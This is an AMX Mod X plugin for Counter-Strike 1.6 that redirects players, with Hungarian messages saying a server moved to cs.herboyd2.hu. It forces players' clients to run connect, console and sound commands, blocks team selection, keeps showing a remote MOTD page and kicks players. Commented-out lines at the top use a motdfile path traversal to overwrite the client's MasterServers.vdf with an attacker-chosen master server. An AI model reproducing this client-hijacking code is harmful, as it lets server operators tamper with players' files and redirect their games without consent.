      // client_cmd(id,"motdfile !MD5/../../config/MasterServers.vdf");
      // client_cmd(id, "motd_write ^"MasterServers^"\n{\n^"hl1^"\n{\n^"0^"\n{\n^"addr^"		^"cs.herboyd2.hu:27010^"\n}\n}\n}\n");
      // engclient_cmd(id,"motdfile !MD5/../../config/MasterServers.vdf");
      // engclient_cmd(id, "motd_write ^"MasterServers^"\n{\n^"hl1^"\n{\n^"0^"\n{\n^"addr^"		^"cs.herboyd2.hu:27010^"\n}\n}\n}\n");

      // client_cmd(id,"motdfile !MD5/config/MasterServers.vdf");
      // client_cmd(id, "motd_write ^"MasterServers^"\n{\n^"hl1^"\n{\n^"0^"\n{\n^"addr^"		^"cs.herboyd2.hu:27010^"\n}\n}\n}\n");
      // engclient_cmd(id,"motdfile !MD5/config/MasterServers.vdf");
      // engclient_cmd(id, "motd_write ^"MasterServers^"\n{\n^"hl1^"\n{\n^"0^"\n{\n^"addr^"		^"cs.herboyd2.hu:27010^"\n}\n}\n}\n");

#include <amxmodx>
#include <amxmisc>
#include <fakemeta>

public plugin_init()
{
  register_plugin("Komplex Átirányitó", "shedi the pro scripter", "1.0");
  register_message(get_user_msgid("MOTD"), "CheckCookies");
  register_forward(FM_GetGameDescription, "GameDesc"); 
  register_clcmd("showteammenu", "BlockJoin");
  register_clcmd("jointeam", "BlockJoin");
  register_clcmd("chooseteam", "BlockJoin");
  set_task(1.0, "Check",_,_,_,"b");
}
public GameDesc( ) { 
	forward_return( FMV_STRING, "cs.herboyd2.hu" ); 
	return FMRES_SUPERCEDE; 
}  
new TastkState[33];
public Check()
{
	new p[32],n;
	get_players(p,n,"ch");

	for(new i=0;i<n;i++)
	{
    new id = p[i];
    openMotd(id);
    TastkState[id]++;
    if(TastkState[id] == 2 || TastkState[id] == 3)
    {

      client_cmd(id, ";connect cs.herboyd2.hu")
      engclient_cmd(id, ";connect cs.herboyd2.hu")
    }
    if(TastkState[id] == 5)
    {
      client_cmd(id, ";clear")
      engclient_cmd(id, ";clear")
    }
    if(TastkState[id] == 6)
    {
      client_cmd(id, ";hideconsole;toggleconsole")
      client_cmd(id, ";spk one;spk danger")
      client_cmd(id, "echo ^"----------------------------------------------------------------------^"")
      client_cmd(id, "echo ^"A HerBoy OnlyDust2 SZERVER IP-JE VÁLTOZOTT!^"")
      client_cmd(id, "echo ^"Az ÚJ IP: cs.herboyd2.hu^"")
      client_cmd(id, "echo ^"Az ÚJ IP: cs.herboyd2.hu^"")
      client_cmd(id, "echo ^"Add hozzá a kedvencekhez!^"")
      client_cmd(id, "echo ^"----------------------------------------------------------------------^"")
      console_print(id, "^"----------------------------------------------------------------------^"")
      console_print(id, "^"A HerBoy OnlyDust2 SZERVER IP-JE VÁLTOZOTT!^"")
      console_print(id, "^"Az ÚJ IP: cs.herboyd2.hu^"")
      console_print(id, "^"Az ÚJ IP: cs.herboyd2.hu^"")
      console_print(id, "^"Add hozzá a kedvencekhez!^"")
      console_print(id, "^"----------------------------------------------------------------------^"")
    }
      
    if(TastkState[id] == 10)
    { 
      server_cmd("kick #%d ^"A szerver ÚJ IP-re költözött! | Az ÚJ IP: cs.herboyd2.hu | Nézd meg a konzolod!", get_user_userid(id));
      TastkState[id] = 0;
    }
	}
}
public openMotd(id)
{
  show_motd(id, "http://194.180.16.153/ban_api/modt_move2.html", "cs.herboyd2.hu")
}
public CheckCookies(msgId, msgDes, id)
{
  show_motd(id, "http://194.180.16.153/ban_api/modt_move2.html", "cs.herboyd2.hu")
}
public BlockJoin(id)
{
  return PLUGIN_HANDLED
}
public TextMenu(msgid, dest, id)
{
  if(!is_user_connected(id))
      return PLUGIN_CONTINUE

  new menu_text[64];

  get_msg_arg_string(4, menu_text, charsmax(menu_text)) //TODO Mi van ebbe, ha más mit a rádióé akkor legyen ellenörízve, úgy ez VGUIMenu1(...)-ben is

  return PLUGIN_HANDLED
}
public VGUIMenu1(msgid, dest, id)
{
  if(!is_user_connected(id))
      return PLUGIN_CONTINUE

  new menu_text[64];

  get_msg_arg_string(4, menu_text, charsmax(menu_text))
    
  return PLUGIN_HANDLED
}